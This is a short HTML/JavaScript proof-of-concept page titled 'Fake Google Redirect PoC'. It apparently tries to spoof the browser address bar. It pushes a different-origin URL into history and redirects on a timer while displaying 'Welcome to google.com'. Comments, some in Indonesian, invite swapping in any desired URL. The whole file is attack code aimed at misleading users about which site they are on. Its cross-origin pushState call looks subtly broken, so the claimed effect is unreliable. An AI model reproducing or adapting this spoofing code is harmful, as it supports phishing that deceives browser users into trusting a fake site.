<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Fake Google Redirect PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
  text-align: center;
}

button {
  margin: 40px;
  font-size: 18px;
  padding: 10px 18px;
  background-color: #4285F4;
  color: #fff;
  border: none;
  border-radius: 8px;
}

#message {
  display: none;
  margin-top: 50px;
  font-size: 24px;
  color: #4285F4;
}
</style>
</head>

<body>

<div>
  <button id="trigger">Start Fake Google</button>
</div>

<div id="message">
  <h2>Welcome to <span style="color: #fbbc05;">google.com</span></h2>
  <p>This is a fake Google page for demonstration purposes.</p>
</div>

<script>
const trigger = document.getElementById('trigger');
const message = document.getElementById('message');

trigger.onclick = () => {
  // Directly change the URL to the fake Google page
  history.pushState({}, '', 'http://example.com:9000');  // Ganti ke URL yang diinginkan
  message.style.display = 'block';

  // Delay for 500ms before changing the URL
  setTimeout(() => {
    location.href = 'http://example.com:9000';  // URL dengan port
  }, 500); // Increased delay for better timing on Android
};

// Trigger navigation after the page is shown (simulating desync)
window.addEventListener('pageshow', () => {
  setTimeout(() => {
    location.href = 'http://example.com:9000';  // Ganti ke URL yang diinginkan
  }, 500); // Added delay for Android compatibility
});
</script>

</body>
</html>
